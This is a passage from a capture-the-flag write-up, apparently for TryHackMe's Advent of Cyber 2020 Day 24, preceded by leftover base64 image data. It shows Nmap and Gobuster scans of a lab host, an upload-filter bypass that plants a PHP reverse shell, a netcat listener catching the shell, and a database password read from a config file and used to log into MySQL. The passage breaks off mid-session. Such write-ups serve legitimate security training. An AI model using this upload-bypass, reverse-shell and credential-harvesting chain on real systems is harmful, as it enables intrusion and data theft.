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" width="1181" height="437" class="img_ev3q"></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="looking-for-a-vss-scheduled-task">Looking for a VSS scheduled task<a href="#looking-for-a-vss-scheduled-task" class="hash-link" aria-label="Direct link to Looking for a VSS scheduled task" title="Direct link to Looking for a VSS scheduled task">​</a></h3><p>Looking through the scheduled tasks, we also find <code>ShadowCopyVolume{7a9eea15-0000-0000-0000-010000000000}</code> which seems to be the part of the Volume Shadow Copu Service.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="day-24-the-trial-before-christmas">Day 24: The Trial Before Christmas<a href="#day-24-the-trial-before-christmas" class="hash-link" aria-label="Direct link to Day 24: The Trial Before Christmas" title="Direct link to Day 24: The Trial Before Christmas">​</a></h2><p><em>Category: Special</em><br>
<em>Tags: Web, Linux</em><br>
<em>Special Contributer: DarkStar7471</em></p><blockquote><p>Ready for one last challenge to make sure you&#x27;ve earned your presents this year? Use the skills gained throughout Advent of Cyber to prove your mettle and conquer day twenty four!</p></blockquote><p>IP: <code>10.10.126.85</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="basic-enumeration-8">Basic Enumeration<a href="#basic-enumeration-8" class="hash-link" aria-label="Direct link to Basic Enumeration" title="Direct link to Basic Enumeration">​</a></h3><p>As always, we start off with an Nmap scan.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Nmap 7.80 scan initiated Thu Dec 24 15:23:48 2020 as: nmap -sC -sV -vvv -oN nmap.log 10.10.126.85</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap scan report for 10.10.126.85</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host is up, received syn-ack (0.16s latency).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Scanned at 2020-12-24 15:23:48 EST for 37s</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Not shown: 998 closed ports</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Reason: 998 conn-refused</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PORT      STATE SERVICE REASON  VERSION</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">80/tcp    open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| http-methods: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  Supported Methods: POST OPTIONS HEAD GET</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">65000/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| http-cookie-flags: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   /: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     PHPSESSID: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_      httponly flag not set</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| http-methods: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  Supported Methods: GET HEAD POST OPTIONS</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-title: Light Cycle</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Read data files from: /usr/bin/../share/nmap</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Nmap done at Thu Dec 24 15:24:25 2020 -- 1 IP address (1 host up) scanned in 36.97 seconds</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="what-is-the-title-of-the-webpages">What is the title of the webpages<a href="#what-is-the-title-of-the-webpages" class="hash-link" aria-label="Direct link to What is the title of the webpages" title="Direct link to What is the title of the webpages">​</a></h3><p>A copy of the <code>TryHackMe</code> website is running on port 80 and <code>Light Cycle</code> is running on port 65000.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="gobuster">Gobuster<a href="#gobuster" class="hash-link" aria-label="Direct link to Gobuster" title="Direct link to Gobuster">​</a></h3><p>I then ran gobuster on both ports.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">bluemoon@dragonfly:~/ctf/thm/thm-advent/day24-the-trial-before-christmas$ gobuster -u 10.10.126.85 -w ~/ctf/common.txt -x php</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">=====================================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Gobuster v2.0.1              OJ Reeves (@TheColonial)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">=====================================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Mode         : dir</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Url/Domain   : http://10.10.126.85/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Threads      : 10</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Wordlist     : /home/bluemoon/ctf/common.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Status codes : 200,204,301,302,307,403</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Extensions   : php</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Timeout      : 10s</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">=====================================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2020/12/24 16:05:52 Starting gobuster</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">=====================================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/.hta (Status: 403)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/.hta.php (Status: 403)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/.htaccess (Status: 403)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/.htaccess.php (Status: 403)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/.htpasswd (Status: 403)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/.htpasswd.php (Status: 403)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/3 (Status: 301)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/codes (Status: 301)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/index.html (Status: 200)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/server-status (Status: 403)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">=====================================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2020/12/24 16:07:35 Finished</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">=====================================================</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">bluemoon@dragonfly:~/ctf/thm/thm-advent/day24-the-trial-before-christmas$ gobuster -u http://10.10.126.85:65000 -w ~/ctf/common.txt -x php</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">=====================================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Gobuster v2.0.1              OJ Reeves (@TheColonial)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">=====================================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Mode         : dir</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Url/Domain   : http://10.10.126.85:65000/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Threads      : 10</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Wordlist     : /home/bluemoon/ctf/common.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Status codes : 200,204,301,302,307,403</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Extensions   : php</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Timeout      : 10s</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">=====================================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2020/12/24 16:06:14 Starting gobuster</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">=====================================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/.hta (Status: 403)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/.hta.php (Status: 403)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/.htaccess (Status: 403)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/.htaccess.php (Status: 403)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/.htpasswd (Status: 403)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/.htpasswd.php (Status: 403)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/api (Status: 301)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/assets (Status: 301)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/grid (Status: 301)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/index.php (Status: 200)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/index.php (Status: 200)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/server-status (Status: 403)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/uploads.php (Status: 200)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">=====================================================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2020/12/24 16:07:53 Finished</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">=====================================================</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Looking at the <code>Light Cycle</code> website, <code>uploads.php</code> looks like where we can upload files and <code>/grid</code> looks ike a place where we can access the files we have uploaded.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="evading-the-upload-filter">Evading the upload filter<a href="#evading-the-upload-filter" class="hash-link" aria-label="Direct link to Evading the upload filter" title="Direct link to Evading the upload filter">​</a></h3><p>At <code>http://10.10.126.85:65000/uploads.php</code>, we see an upload form.</p><p><img loading="lazy" alt="screenshot" src="/assets/images/uploads-f8dac5e837fa72d1d0c8dc12eadb66df.png" width="1528" height="708" class="img_ev3q"></p><p>However, this is protected by both a server and client side filter. We can use BurpSuite to intercept the web traffic and then drop the request for <code>filter.js</code>. Next, we can mess with the file extension of a php reverse shell to get through the server side filter. We can rename <code>php-reverse-shell.php</code> as <code>php-reverse-shell.jpg.php</code>. We also see that any file we upload ends up in the <code>/grid/</code> directory.</p><p><img loading="lazy" alt="screenshot" src="/assets/images/grid-289e78d7a0b7abe41637032e64f882f8.png" width="546" height="256" class="img_ev3q"></p><p>Next, we set up a netcat listener and wait for the connection to come through once we click on it!</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">bluemoon@dragonfly:~/ctf/thm/thm-advent/day24-the-trial-before-christmas$ nc -lvnp 4444</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Listening on 0.0.0.0 4444</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Connection received on 10.10.126.85 60820</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Linux light-cycle 4.15.0-128-generic #131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> 21:31:02 up 32 min,  0 users,  load average: 0.00, 0.00, 0.12</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/bin/sh: 0: can&#x27;t access tty; job control turned off</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>JACKPOT!</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="getting-web-flag-webtxt">Getting web flag: <code>web.txt</code><a href="#getting-web-flag-webtxt" class="hash-link" aria-label="Direct link to getting-web-flag-webtxt" title="Direct link to getting-web-flag-webtxt">​</a></h3><p>Since we are currently <code>www-data</code>, we will probably find the <code>web.txt</code> file in our home directory: <code>/var/www</code>.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cat /var/www/web.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">THM{ENTER_THE_GRID}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Web Flag: <code>THM{ENTER_THE_GRID}</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="spawning-a-stable-shell-using-python">Spawning a stable shell using Python<a href="#spawning-a-stable-shell-using-python" class="hash-link" aria-label="Direct link to Spawning a stable shell using Python" title="Direct link to Spawning a stable shell using Python">​</a></h3><p>We can use python to spawn a stable shell</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ python3 -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">www-data@light-cycle:/var/www$ </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="poking-through-the-filesystem">Poking through the filesystem<a href="#poking-through-the-filesystem" class="hash-link" aria-label="Direct link to Poking through the filesystem" title="Direct link to Poking through the filesystem">​</a></h3><p>Although <code>www-data</code> is very unpriviledged, we can still look through the <code>/var/www</code> folder. One particularly interesting file is <code>/var/www/TheGrid/includes/dbauth.php</code> which contains the credentials to a MySQL database: <code>tron:IFightForTheUsers</code>.</p><div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">&lt;?php</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        $dbaddr = &quot;localhost&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        $dbuser = &quot;tron&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        $dbpass = &quot;IFightForTheUsers&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        $database = &quot;tron&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        $dbh = new mysqli($dbaddr, $dbuser, $dbpass, $database);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        if($dbh-&gt;connect_error){</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                die($dbh-&gt;connect_error);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">?&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="accessing-the-database">Accessing the database<a href="#accessing-the-database" class="hash-link" aria-label="Direct link to Accessing the database" title="Direct link to Accessing the database">​</a></h3><p>Now we can poke through the MySQL database. Run <code>mysql -u tron -p</code> in the terminal to get access to the MySQL command line interface.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">www-data@light-cycle:/var/www/TheGrid/includes$ mysql -u tron -p</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mysql -u tron -p</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Enter password: IFightForTheUsers</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Your MySQL connection id is 6</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Server version: 5.7.32-0ubuntu0.18.04.1 (Ubuntu)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" 